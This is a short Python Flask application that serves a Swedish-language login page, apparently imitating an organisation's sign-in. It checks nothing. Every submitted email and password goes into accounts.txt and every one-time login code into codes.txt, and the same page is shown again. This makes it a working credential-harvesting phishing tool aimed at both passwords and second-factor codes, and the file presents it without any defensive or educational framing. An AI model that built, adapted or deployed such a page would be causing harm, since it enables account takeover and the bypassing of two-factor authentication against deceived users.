from flask import Flask, render_template, redirect, url_for
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField

app = Flask(__name__)
app.config["SECRET_KEY"] = "YOUR_KEY_HERE"


class FormLogin(FlaskForm):
    email = StringField('Email: ')
    password = PasswordField('Lösenord: ')
    submit = SubmitField('Logga in')

class OneTimeLogin(FlaskForm):
    code = StringField('Engångskod: ')
    submit = SubmitField('Logga in')


@app.route("/")
def redirectToLogin():
    return redirect(url_for("index"))

@app.route("/login", methods=["GET", "POST"])
def index():
    loginDetails = FormLogin()
    ticketDetails = OneTimeLogin()

    if loginDetails.validate_on_submit() and loginDetails.email.data != None and loginDetails.password.data != None:
        with open("accounts.txt","a") as file:
            file.write(str(loginDetails.email.data) + ", " + str(loginDetails.password.data) + "\n")
    
    if ticketDetails.is_submitted() and ticketDetails.code.data != None:
        with open("codes.txt","a") as file:
            file.write(str(ticketDetails.code.data) + "\n")



    return render_template("SML-Publikt.html", form=loginDetails, ticket=ticketDetails)


if __name__ == "__main__":
   	app.run(debug=False, host="0.0.0.0")
   	
